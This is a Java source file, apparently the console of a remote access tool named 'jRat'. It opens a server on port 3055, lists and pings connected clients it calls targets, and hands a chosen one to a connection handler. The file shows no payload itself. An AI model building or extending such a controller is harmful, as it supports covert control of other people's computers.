package ServerGUI;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;
import java.util.Iterator;
import java.util.concurrent.ConcurrentHashMap;

import Server.Server;
import Server.Streams;

import javax.swing.*;


public class MainClass {


    private static void getSysInfo(){

    }

    private static void ping(Server server){
        ConcurrentHashMap <Socket, Streams> map = server.getMap();
        int i = 0;
        for (Socket s : map.keySet()){
            if (!map.get(s).sendMsg("PING") || map.get(s).readMsg() == null){
                System.err.println("Client not answering: " + s.getRemoteSocketAddress());
                System.err.flush();
                map.remove(s);
            }
            else {
                System.out.println(i + ") " + s.getRemoteSocketAddress());
                i++;
            }
        }
    }

    private static void connect(Server server) {
        System.out.println("\nSelect a target: [0..n]");
        ping(server);
        try {
            int selected = Integer.parseInt(new BufferedReader(new InputStreamReader(System.in)).readLine());
            Iterator <Socket> iterator = server.getMap().keySet().iterator();
            Socket selectedSocket = iterator.next();
            for  (int i = 0; i != selected; i++)
                if (iterator.hasNext())
                    selectedSocket = iterator.next();
                else
                {
                    System.err.println("Invalid index specified");
                    return;
                }
            Streams selectedStreams = server.getMap().get(selectedSocket);
            Connections connected = new Connections(selectedStreams);
            connected.execute();
        } catch (NumberFormatException | IOException ignored) {

        }
    }


    static public jRatGUI gui;
    public static void main(String[] args) {
        try {
            SwingUtilities.invokeLater(() -> gui = new jRatGUI());

            Server server = new Server(3055);
            server.startServer();
            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
            String sel;
            while(true){
                System.out.println("\nChoose an operation to execute:\ns- Stop the server\np - Show and ping connected devices\nc - Connect to a client\ne - Exit the program");
                sel = reader.readLine();
                switch (sel){
                    case "s":	if (!server.isRunning()){
                        System.err.println("Server already idle");
                        System.err.flush();
                    }
                    else
                        server.stopServer();
                        break;
                    case "p":	if (!server.isRunning()) {
                        System.err.println("Server in idle state");
                        System.err.flush();
                        break;
                    }
                        ping(server);
                        break;
                    case "c":	if (!server.isRunning()) {
                        System.err.println("Server in idle state");
                        System.err.flush();
                        break;
                    }
                        connect(server);
                        break;
                    case "e":	if (server.isRunning()) server.stopServer();
                        reader.close();
                        return;
                    default: break;
                }
            }
        }
        catch (Exception e) { System.err.println("Server exception!\n"); e.printStackTrace(); }

    }

}